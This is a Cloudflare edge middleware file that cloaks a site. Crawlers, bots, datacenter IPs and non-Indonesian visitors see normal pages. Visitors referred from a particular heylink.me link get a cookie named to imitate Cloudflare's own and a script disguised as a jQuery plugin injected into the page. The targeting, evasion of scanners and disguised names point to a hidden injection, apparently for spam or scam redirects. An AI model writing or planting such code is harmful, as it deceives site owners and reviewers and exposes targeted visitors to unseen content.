export async function onRequest(context) {
  const { request, next } = context;
  const url = new URL(request.url);
  if (url.pathname.startsWith('/assets/')) return next();
  const headers = request.headers;
  const userAgent = (headers.get('user-agent') || '').toLowerCase();
  const referer = (headers.get('referer') || '').toLowerCase();
  const cookies = headers.get('cookie') || '';
  const ticketName = "__cf_bm_auth";
  const hasTicket = cookies.includes(`${ticketName}=true`);
  const isFromHeylink = referer.includes('heylink.me/kopi-sensa');
  const country = request.cf ? request.cf.country : 'Unknown';
  const asOrg = (request.cf ? request.cf.asOrganization : '').toLowerCase();
  const cloudList = ['amazon','google','digitalocean','microsoft','cloudflare','akamai','linode','ovh','mweb','data','host','server','vps'];
  const isCloud = cloudList.some(c => asOrg.includes(c));
  if (country !== 'ID' || isCloud || /bot|spider|crawl|lighthouse/i.test(userAgent)) {
    return next();
  }
  if (isFromHeylink && !hasTicket) {
    return new Response(null, {
      status: 302,
      headers: {
        'Location': url.toString(),
        'Set-Cookie': `${ticketName}=true; Max-Age=15; Path=/; SameSite=Lax; Secure`,
        'Cache-Control': 'no-cache'
      }
    });
  }
  if (hasTicket) {
    const response = await next();
    return new HTMLRewriter()
      .on('body', {
        element(el) {
          el.append(`<script src="/assets/jquery.scroll-min.js" defer></script>`, { html: true });
        },
      })
      .transform(response);
  }
  return next();
}
